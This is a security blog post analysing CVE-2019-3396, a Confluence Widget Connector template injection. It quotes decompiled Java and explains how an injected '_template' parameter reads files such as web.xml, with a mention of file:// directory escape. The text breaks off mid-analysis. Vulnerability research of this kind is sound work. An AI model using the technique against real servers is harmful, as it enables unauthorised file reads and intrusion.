<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="JAVA," />










<meta name="description" content="On March 20, 2019, Confluence released a security alert, there was a server-side template injection vulnerability(CVE-2019-3396) in Confluence Server and Data C">
<meta name="keywords" content="JAVA">
<meta property="og:type" content="article">
<meta property="og:title" content="Confluence Unauthorized RCE Vulnerability(CVE-2019-3396) Analysis">
<meta property="og:url" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/index.html">
<meta property="og:site_name" content="Badcode">
<meta property="og:description" content="On March 20, 2019, Confluence released a security alert, there was a server-side template injection vulnerability(CVE-2019-3396) in Confluence Server and Data Center, in the Widget Connector. An attac">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/1.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/2.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/3.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/4.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/5.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/6.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/7.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/8.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/9.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/10.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/11.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/12.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/13.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/14.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/15.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/16.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/17.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/18.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/19.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/20.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/22.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/21.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/25.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/23.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/24.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/26.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/27.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/28.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/29.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/30.png">
<meta property="og:updated_time" content="2019-04-12T09:45:09.543Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Confluence Unauthorized RCE Vulnerability(CVE-2019-3396) Analysis">
<meta name="twitter:description" content="On March 20, 2019, Confluence released a security alert, there was a server-side template injection vulnerability(CVE-2019-3396) in Confluence Server and Data Center, in the Widget Connector. An attac">
<meta name="twitter:image" content="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/"/>





  <title>Confluence Unauthorized RCE Vulnerability(CVE-2019-3396) Analysis | Badcode</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Badcode</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://badgsd.github.io/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Badcode">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Badcode">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Confluence Unauthorized RCE Vulnerability(CVE-2019-3396) Analysis</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-10T17:37:04+08:00">
                2019-04-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>On March 20, 2019, Confluence released a <a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html" target="_blank" rel="noopener">security alert</a>, there was a server-side template injection vulnerability(CVE-2019-3396) in Confluence Server and Data Center, in the Widget Connector. An attacker is able to exploit this issue to achieve path traversal and remote code execution on systems that run a vulnerable version of Confluence Server or Data Center.I started researching this vulnerability. </p>
<p><img src="1.png" alt=""></p>
<p>Confirmed that the vulnerability point occurred in the Widget Connector, I download the latest version of the comparison patch.  There is an additional filter in the <code>com\atlassian\confluence\extra\widgetconnector\WidgetMacro.java</code> file, I think this should be the key point in the vulnerability.</p>
<p><img src="2.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.sanitizeFields = Collections.unmodifiableList(Arrays.asList(VelocityRenderService.TEMPLATE_PARAM));</span><br></pre></td></tr></table></figure>
<p>As we can see, the value of <code>TEMPLATE_PARAM</code> is <code>_template</code>, so this patch filters the external incoming <code>_template</code> parameter.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public interface VelocityRenderService &#123;</span><br><span class="line">    public static final String WIDTH_PARAM = &quot;width&quot;;</span><br><span class="line">    public static final String HEIGHT_PARAM = &quot;height&quot;;</span><br><span class="line">    public static final String TEMPLATE_PARAM = &quot;_template&quot;;</span><br></pre></td></tr></table></figure>
<p>Looked at the files inside the Widget Connector and found that <code>TEMPLATE_PARAM</code> is the path to the template file.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class FriendFeedRenderer implements WidgetRenderer &#123;</span><br><span class="line">    private static final String MATCH_URL = &quot;friendfeed.com&quot;;</span><br><span class="line">    private static final String PATTERN = &quot;friendfeed.com/(\\w+)/?&quot;;</span><br><span class="line">    private static final String VELOCITY_TEMPLATE = &quot;com/atlassian/confluence/extra/widgetconnector/templates/simplejscript.vm&quot;;</span><br><span class="line">    private VelocityRenderService velocityRenderService;</span><br><span class="line">......</span><br><span class="line">    public String getEmbeddedHtml(String url, Map&lt;String, String&gt; params) &#123;</span><br><span class="line">        params.put(VelocityRenderService.TEMPLATE_PARAM, VELOCITY_TEMPLATE);</span><br><span class="line">        return velocityRenderService.render(getEmbedUrl(url), params);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>When the external link is loaded, the relative template is called to render. As above, the path of templates is generally Hard coding, but there are exceptions. The role of the patch also indicates that someone broke the limit and invoked an unexpected template, resulting in a template injection.</p>
<p>After knowing the patch and having some rough guesses, I began to try.</p>
<p>First of all, I found this function. I looked through the official documents and found this function. You can embed some videos, documents and so on in the documents.</p>
<p><img src="3.png" alt=""></p>
<p>Seeing this, I was a little excited, because in the process of watching the patch, I found several parameters, <code>url</code>, <code>width</code>, <code>height</code> exactly correspond to here, is <code>_template</code> also passed in from here?</p>
<p>Just find a Youtube video to insert, click Preview, use Burpsuite to capture the package.</p>
<p><img src="4.png" alt=""></p>
<p>Try inserting the <code>_template</code> parameter in params, well, nothing happens. .</p>
<p><img src="5.png" alt=""></p>
<p>Start the debug mode, because the test inserts Youtube video, so the call is <code>com/atlassian/confluence/extra/widgetconnector/video/YoutubeRenderer.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">YoutubeRenderer</span> <span class="keyword">implements</span> <span class="title">WidgetRenderer</span>, <span class="title">WidgetImagePlaceholder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern YOUTUBE_URL_PATTERN = Pattern.compile(<span class="string">"https?://(.+\\.)?youtube.com.*(\\?v=([^&amp;]+)).*$"</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PlaceholderService placeholderService;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String DEFAULT_YOUTUBE_TEMPLATE = <span class="string">"com/atlassian/confluence/extra/widgetconnector/templates/youtube.vm"</span>;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEmbedUrl</span><span class="params">(String url)</span> </span>&#123;</span><br><span class="line">        Matcher youtubeUrlMatcher = YOUTUBE_URL_PATTERN.matcher(<span class="keyword">this</span>.verifyEmbeddedPlayerString(url));</span><br><span class="line">        <span class="keyword">return</span> youtubeUrlMatcher.matches() ? String.format(<span class="string">"//www.youtube.com/embed/%s?wmode=opaque"</span>, youtubeUrlMatcher.group(<span class="number">3</span>)) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">matches</span><span class="params">(String url)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> YOUTUBE_URL_PATTERN.matcher(<span class="keyword">this</span>.verifyEmbeddedPlayerString(url)).matches();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">verifyEmbeddedPlayerString</span><span class="params">(String url)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !url.contains(<span class="string">"feature=player_embedded&amp;"</span>) ? url : url.replace(<span class="string">"feature=player_embedded&amp;"</span>, <span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEmbeddedHtml</span><span class="params">(String url, Map&lt;String, String&gt; params)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.velocityRenderService.render(<span class="keyword">this</span>.getEmbedUrl(url), <span class="keyword">this</span>.setDefaultParam(params));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>In <code>getEmbeddedHtml</code> breakpoint, first call <code>getEmbedUrl</code> to the user’s incoming url for regular matching, because we are passing a normal youtube video, so here is no problem, then call <code>setDefaultParam</code> function to process other parameters passed in.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Map&lt;String, String&gt; <span class="title">setDefaultParam</span><span class="params">(Map&lt;String, String&gt; params)</span> </span>&#123;</span><br><span class="line">    String width = (String)params.get(<span class="string">"width"</span>);</span><br><span class="line">    String height = (String)params.get(<span class="string">"height"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!params.containsKey(<span class="string">"_template"</span>)) &#123;</span><br><span class="line">        params.put(<span class="string">"_template"</span>, <span class="string">"com/atlassian/confluence/extra/widgetconnector/templates/youtube.vm"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isEmpty(width)) &#123;</span><br><span class="line">        params.put(<span class="string">"width"</span>, <span class="string">"400px"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (StringUtils.isNumeric(width)) &#123;</span><br><span class="line">        params.put(<span class="string">"width"</span>, width.concat(<span class="string">"px"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isEmpty(height)) &#123;</span><br><span class="line">        params.put(<span class="string">"height"</span>, <span class="string">"300px"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (StringUtils.isNumeric(height)) &#123;</span><br><span class="line">        params.put(<span class="string">"height"</span>, height.concat(<span class="string">"px"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Take the values of <code>width</code> and <code>height</code> from params to judge whether it is empty, and set the default value if it is empty. The key <code>_template</code> parameter comes up. If the externally passed parameter does not have <code>_template</code>, the default Youtube template will be set. If it is passed in, it will be passed in, that is to say, <code>aaaa</code> is successfully passed in.</p>
<p><img src="6.png" alt=""></p>
<p>After looking at the Renderer in Widget Connector, most of them can’t set <code>_template</code>, which is a direct hardcode. There are also some exceptions, such as Youtube, Viddler, DailyMotion, etc., which can be passed to <code>_template</code> from the outside.</p>
<p>Can pass <code>_template</code> now, let’s look at how to get and render the template.</p>
<p>Follow up with <code>this.velocityresiderservice.render</code>，which is the render method in <code>com/atlassian/confluence/extra/widgetconnector/services/DefaultVelocityRenderService.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">render</span><span class="params">(String url, Map&lt;String, String&gt; params)</span> </span>&#123;</span><br><span class="line">    String width = (String)params.get(<span class="string">"width"</span>);</span><br><span class="line">    String height = (String)params.get(<span class="string">"height"</span>);</span><br><span class="line">    String template = (String)params.get(<span class="string">"_template"</span>);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isEmpty(template)) &#123;</span><br><span class="line">        template = <span class="string">"com/atlassian/confluence/extra/widgetconnector/templates/embed.vm"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isEmpty(url)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; contextMap = <span class="keyword">this</span>.getDefaultVelocityContext();</span><br><span class="line">        Iterator var7 = params.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var7.hasNext()) &#123;</span><br><span class="line">            Entry&lt;String, String&gt; entry = (Entry)var7.next();</span><br><span class="line">            <span class="keyword">if</span> (((String)entry.getKey()).contentEquals(<span class="string">"tweetHtml"</span>)) &#123;</span><br><span class="line">                contextMap.put(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                contextMap.put(entry.getKey(), GeneralUtil.htmlEncode((String)entry.getValue()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        contextMap.put(<span class="string">"urlHtml"</span>, GeneralUtil.htmlEncode(url));</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotEmpty(width)) &#123;</span><br><span class="line">            contextMap.put(<span class="string">"width"</span>, GeneralUtil.htmlEncode(width));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            contextMap.put(<span class="string">"width"</span>, <span class="string">"400"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotEmpty(height)) &#123;</span><br><span class="line">            contextMap.put(<span class="string">"height"</span>, GeneralUtil.htmlEncode(height));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            contextMap.put(<span class="string">"height"</span>, <span class="string">"300"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getRenderedTemplate(template, contextMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_template</code> is taken out and assigned to the template. The other parameters passed in are taken out and put into the <code>contextMap</code> after the judgment, and the <code>getRenderedTemplate</code> function is called, that is, the <code>VelocityUtils.getRenderedTemplate</code> is called.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">getRenderedTemplate</span><span class="params">(String template, Map&lt;String, Object&gt; contextMap)</span></span>&#123;</span><br><span class="line">     <span class="keyword">return</span> VelocityUtils.getRenderedTemplate(template, contextMap);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>All the way to call, the call chain is as shown below, and finally comes to the <code>loadResource</code> function of <code>/com/atlassian/confluence/util/velocity/ConfigurableResourceManager.class</code> to get the template.</p>
<p><img src="7.png" alt=""></p>
<p>Here we call 4 <code>ResourceLoaders</code> to get the template.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.atlassian.confluence.setup.velocity.HibernateResourceLoader</span><br><span class="line">org.apache.velocity.runtime.resource.loader.FileResourceLoader</span><br><span class="line">org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader</span><br><span class="line">com.atlassian.confluence.setup.velocity.DynamicPluginResourceLoader</span><br></pre></td></tr></table></figure>
<p>Here mainly look at the <code>FileResourceLoader</code> and <code>ClasspathResourceLoader</code> that comes with Velocity.</p>
<p><code>FileResourceLoader</code> will verify the template path passed by the user using the <code>normalizePath</code> function.</p>
<p><img src="8.png" alt=""></p>
<p>As you can see, filtering<code>/../</code>, which leads to no way to jump to the directory.</p>
<p><img src="9.png" alt=""></p>
<p>After the path is filtered, call <code>findTemplate</code> to find the template. You can see that a fixed <code>path</code> will be spliced. This is the installation path of Confluence.<img src="10.png" alt=""></p>
<p>This means that you can now use the <code>FileResourceLoader</code> to read the files under the Confluence directory.</p>
<p>Try to read the <code>/WEB-INF/web.xml</code> file and you can see that it was successfully loaded into the file.</p>
<p><img src="11.png" alt="">But this can’t jump out of Confluence’s directory because you can’t use <code>/../</code>.</p>
<p>Look at the <code>ClasspathResourceLoader</code> again.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> InputStream <span class="title">getResourceStream</span><span class="params">(String name)</span> <span class="keyword">throws</span> ResourceNotFoundException </span>&#123;</span><br><span class="line">        InputStream result = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ResourceNotFoundException(<span class="string">"No template name provided"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                result = ClassUtils.getResourceAsStream(<span class="keyword">this</span>.getClass(), name);</span><br><span class="line">......</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>Follow up<code>ClassUtils.getResourceAsStream</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InputStream <span class="title">getResourceAsStream</span><span class="params">(Class claz, String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(name.startsWith(<span class="string">"/"</span>)) &#123;</span><br><span class="line">        name = name.substring(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    InputStream result;</span><br><span class="line">    <span class="keyword">if</span> (classLoader == <span class="keyword">null</span>) &#123;</span><br><span class="line">        classLoader = claz.getClassLoader();</span><br><span class="line">        result = classLoader.getResourceAsStream(name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = classLoader.getResourceAsStream(name);</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="keyword">null</span>) &#123;</span><br><span class="line">            classLoader = claz.getClassLoader();</span><br><span class="line">            <span class="keyword">if</span> (classLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                result = classLoader.getResourceAsStream(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Will jump to<code>/org/apache/catalina/loader/WebappClassLoaderBase.class</code></p>
<p><img src="12.png" alt=""></p>
<p>Following up, it was found that <code>/WEB-INF/classes</code> would be spliced, and <code>normalize</code> was also called to filter the incoming path. .</p>
<p><img src="13.png" alt="">Here you can still use <code>../</code> to jump to the first level directory.</p>
<p>Try to read <code>../web.xml</code>, you can see that it can also be read successfully, but still can not jump out of the directory.</p>
<p><img src="14.png" alt=""></p>
<p>The version I tested here is 6.14.1, and then I tried <code>file://</code>,<code>http://</code>, <code>https://</code>. all failed. Later, I tried to delete the Cookie and found that files can still be read under Linux environment. Windows version 6.14.1 needs to log in, but cannot jump out of the directory. This is where the research stopped.</p>
<p>In the next few days, other researchers used the <code>file://</code> protocol to jump out of the directory limit. I was shocked. I was sure that I had tried it and it was not successful. I saw screenshots of other researchers and found that I used the version of 6.9.0. I downloaded it and tried it. I found it really.And in the 6.9.0 version, Windows and Linux environments do not need to log in.</p>
<p>The problem is still in the <code>ClasspathResourceLoader</code>, the steps are the same as before, break the <code>getResourceAsStream</code> method of <code>/org/apache/catalina/loader/WebappClassLoaderBase.class</code></p>
